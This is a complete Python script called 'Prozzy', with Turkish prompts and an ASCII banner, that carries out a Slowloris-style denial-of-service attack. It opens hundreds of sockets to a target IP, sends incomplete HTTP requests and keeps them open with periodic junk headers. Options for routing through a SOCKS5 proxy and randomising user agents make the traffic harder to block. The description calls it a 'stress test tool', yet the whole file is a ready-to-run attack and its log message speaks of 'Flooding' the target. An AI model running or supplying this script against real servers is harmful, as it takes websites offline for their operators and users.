#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import sys
import time
import os

def set_terminal_properties():
    os.system('color 5')  # Set terminal text color

set_terminal_properties()

from colorama import init, Fore, Back

init()

ascii_art = f"""
{Fore.RED}                                      


██████╗ ██████╗  ██████╗ ███████╗███████╗██╗   ██╗
██╔══██╗██╔══██╗██╔═══██╗╚══███╔╝╚══███╔╝╚██╗ ██╔╝
██████╔╝██████╔╝██║   ██║  ███╔╝   ███╔╝  ╚████╔╝ 
██╔═══╝ ██╔══██╗██║   ██║ ███╔╝   ███╔╝    ╚██╔╝  
██║     ██║  ██║╚██████╔╝███████╗███████╗   ██║   
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝   ╚═╝   
                                                  

   
{Fore.RESET}
"""

print(ascii_art)

print("Kullanım: python prozzy.py <IP>")
print("Örnek: python prozzy.py 192.168.1.1")

parser = argparse.ArgumentParser(
    description="Prozzy, low bandwidth stress test tool for websites"
)
parser.add_argument("host", nargs="?", help="Host to perform stress test on")
parser.add_argument(
    "-p", "--port", default=80, help="Port of webserver, usually 80", type=int
)
parser.add_argument(
    "-v",
    "--verbose",
    dest="verbose",
    action="store_true",
    help="Increases logging",
)
parser.add_argument(
    "-ua",
    "--randuseragents",
    dest="randuseragent",
    action="store_true",
    help="Randomizes user-agents with each request",
)
parser.add_argument(
    "-x",
    "--useproxy",
    dest="useproxy",
    action="store_true",
    help="Use a SOCKS5 proxy for connecting",
)
parser.add_argument(
    "--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host"
)
parser.add_argument(
    "--proxy-port", default="8080", help="SOCKS5 proxy port", type=int
)
parser.add_argument(
    "--https",
    dest="https",
    action="store_true",
    help="Use HTTPS for the requests",
)
parser.add_argument(
    "--sleeptime",
    dest="sleeptime",
    default=15,
    type=int,
    help="Time to sleep between each header sent.",
)
parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=False)
parser.set_defaults(useproxy=False)
parser.set_defaults(https=False)
args = parser.parse_args()

# Prompt for host if not provided
if not args.host:
    args.host = input("Lütfen hedef IP adresini girin: ")

# Prompt for socket count
args.sockets = int(input("Lütfen kullanmak istediğiniz socket sayısını (100-500 arası) girin: "))
while not (100 <= args.sockets <= 500):
    print("Hata: Socket sayısı 100 ile 500 arasında olmalıdır.")
    args.sockets = int(input("Lütfen kullanmak istediğiniz socket sayısını (100-500 arası) girin: "))

if args.useproxy:
    try:
        import socks
        socks.setdefaultproxy(
            socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port
        )
        socket.socket = socks.socksocket
        logging.info("Using SOCKS5 proxy for connecting...")
    except ImportError:
        logging.error("Socks Proxy Library Not Available!")
        sys.exit(1)

logging.basicConfig(
    format="[%(asctime)s] %(message)s",
    datefmt="%d-%m-%Y %H:%M:%S",
    level=logging.DEBUG if args.verbose else logging.INFO,
)

def send_line(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))

def send_header(self, name, value):
    self.send_line(f"{name}: {value}")

if args.https:
    logging.info("Importing ssl module")
    import ssl
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)

setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)

user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36 OPR/41.0.2353.56",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0.2 Safari/602.3.12",
]

def init_socket(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip, args.port))

    if args.https:
        ctx = ssl.create_default_context()
        s = ctx.wrap_socket(s, server_hostname=args.host)

    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

    if args.randuseragent:
        s.send_header("User-Agent", random.choice(user_agents))
    else:
        s.send_header("User-Agent", user_agents[0])
    s.send_header("Accept-language", "en-US,en,q=0.5")
    return s

def main():
    ip = args.host
    socket_count = args.sockets
    logging.info("Flooding %s:%s with %s sockets.", ip, args.port, socket_count)

    socket_list = []
    for _ in range(socket_count):
        try:
            logging.debug("Creating socket nr %s", _)
            s = init_socket(ip)
        except socket.error as e:
            logging.debug(e)
            break
        socket_list.append(s)

    while True:
        logging.info(
            "Sending keep-alive headers... Socket count: %s",
            len(socket_list),
        )
        for s in list(socket_list):
            try:
                s.send_header("X-a", random.randint(1, 5000))
            except socket.error:
                socket_list.remove(s)

        for _ in range(socket_count - len(socket_list)):
            logging.debug("Recreating socket...")
            try:
                s = init_socket(ip)
                if not s:
                    continue
                socket_list.append(s)
            except socket.error as e:
                logging.debug("Recreating socket failed")
                break
        time.sleep(args.sleeptime)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Kullanım: python prozzy.py <IP>")
        print("Örnek: python prozzy.py 192.168.1.1")
    else:
        main()
